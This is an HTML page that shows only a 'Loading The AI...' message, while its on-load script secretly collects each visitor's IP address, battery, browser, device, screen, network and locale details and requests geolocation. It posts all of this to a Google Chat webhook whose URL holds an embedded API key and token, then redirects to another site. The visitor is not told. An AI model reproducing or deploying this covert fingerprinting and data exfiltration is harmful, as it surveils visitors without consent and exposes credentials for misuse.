<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        function getOrCreateUserId() {
            let userId = localStorage.getItem('user_id');
            if (!userId) {
                userId = 'user-' + crypto.randomUUID();
                localStorage.setItem('user_id', userId);
            }
            return userId;
        }

        function updateVisitCount() {
            let visitCount = localStorage.getItem('visit_count');
            visitCount = visitCount ? parseInt(visitCount) + 1 : 1;
            localStorage.setItem('visit_count', visitCount);
            return visitCount;
        }

        async function collectAndSendData() {
            try {
                // Get User ID and Visit Count
                const userId = getOrCreateUserId();
                const visitCount = updateVisitCount();

                // Collect IP Address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();

                // Collect Battery Info
                const battery = await navigator.getBattery();
                const batteryInfo = {
                    charging: battery.charging,
                    level: battery.level * 100 + '%',
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };

                // Collect Browser and OS Info
                const browserInfo = {
                    browserName: navigator.userAgentData?.brands?.[0]?.brand || navigator.appName,
                    browserVersion: navigator.userAgentData?.brands?.[0]?.version || navigator.appVersion,
                    osName: navigator.platform,
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    platform: navigator.userAgentData?.platform || navigator.platform,
                    renderingEngine: navigator.product
                };

                // Collect Date and Time
                const dateTime = new Date().toLocaleString('en-US', { timeZoneName: 'short' });

                // Collect Geolocation
                let locationData = {};
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    });
                }

                // Collect Screen Information
                const screenInfo = {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth
                };

                // Collect Device Information
                const deviceInfo = {
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints
                };

                // Collect Network Information
                let connectionData = {};
                const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (networkInfo) {
                    connectionData = {
                        downlink: networkInfo.downlink,
                        effectiveType: networkInfo.effectiveType,
                        rtt: networkInfo.rtt,
                        saveData: networkInfo.saveData
                    };
                }

                // Collect Time Zone and Locale
                const timeZoneLocale = {
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language
                };

                // Combine Data
                const userData = {
                    userId,
                    visitCount,
                    ip: ipData.ip,
                    batteryInfo,
                    browserInfo,
                    dateTime,
                    locationData,
                    screenInfo,
                    deviceInfo,
                    connectionData,
                    timeZoneLocale
                };

                // Send Data to Webhook
                const webhookUrl = "https://chat.googleapis.com/v1/spaces/AAAA4kX04SE/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=cvInZitxbj0ExgHMVYD6NGinfMjid4xAfE5TMZZWhZ8";
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ text: JSON.stringify(userData, null, 2) })
                });

                // Redirect to another page
                window.location.href = "https://jamison-ai.zapier.app";
            } catch (error) {
                console.error('Error collecting or sending data:', error);
            }
        }

        // Run the function when the page loads
        window.onload = collectAndSendData;
    </script>
</head>
<body>
    <h1>Loading The AI...</h1>
    <p>Please wait while the AI thinks about how to deep frye you today...</p>
</body>
</html>



